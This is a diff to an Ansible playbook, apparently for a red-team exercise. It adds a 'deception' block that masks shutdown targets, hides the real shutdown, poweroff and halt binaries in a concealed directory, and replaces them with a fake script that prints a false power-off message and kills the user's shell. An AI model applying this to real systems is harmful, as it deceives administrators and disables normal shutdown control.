@@ -200,6 +200,66 @@
       register: sudo_users_after
       failed_when: false
 
+
+    # --- 8.  ---
+    - name: Apply Red Team Deception Block
+      block:
+        - name: Mask systemd shutdown targets
+          systemd:
+            name: "{{ item }}"
+            masked: yes
+          loop:
+            - shutdown.target
+            - poweroff.target
+            - halt.target
+            - kexec.target
+
+        - name: Create hidden backup directory for real binaries
+          file:
+            path: /usr/lib/.sys-backup
+            state: directory
+            mode: '0700'
+
+        - name: Check if real binaries are already moved
+          stat:
+            path: /sbin/shutdown
+          register: shutdown_bin
+
+        - name: Move real binaries to hidden location
+          shell: |
+            mv /sbin/shutdown /usr/lib/.sys-backup/
+            mv /sbin/poweroff /usr/lib/.sys-backup/
+            mv /sbin/halt /usr/lib/.sys-backup/
+          when: 
+            - shutdown_bin.stat.isreg is defined 
+            - shutdown_bin.stat.isreg  # Only move if it's a real file, not a symlink/missing
+
+        - name: Create the Fake Shutdown script
+          copy:
+            dest: /sbin/fake-shutdown
+            mode: '0755'
+            content: |
+              #!/bin/bash
+              echo ""
+              echo "Broadcast message from root@$(hostname) ($(tty)) ($(date +'%a %b %d %H:%M:%S %Y')):"
+              echo ""
+              echo "The system is going down for power-off NOW!"
+              sleep 2
+              # Kill the parent process (the shell session)
+              kill -9 $PPID
+
+        - name: Symlink dangerous commands to the fake script
+          file:
+            src: /sbin/fake-shutdown
+            dest: "/sbin/{{ item }}"
+            state: link
+            force: yes
+          loop:
+            - shutdown
+            - poweroff
+            - halt
+      ignore_errors: yes
+
   handlers:
     - name: Restart SSH Service
       service:
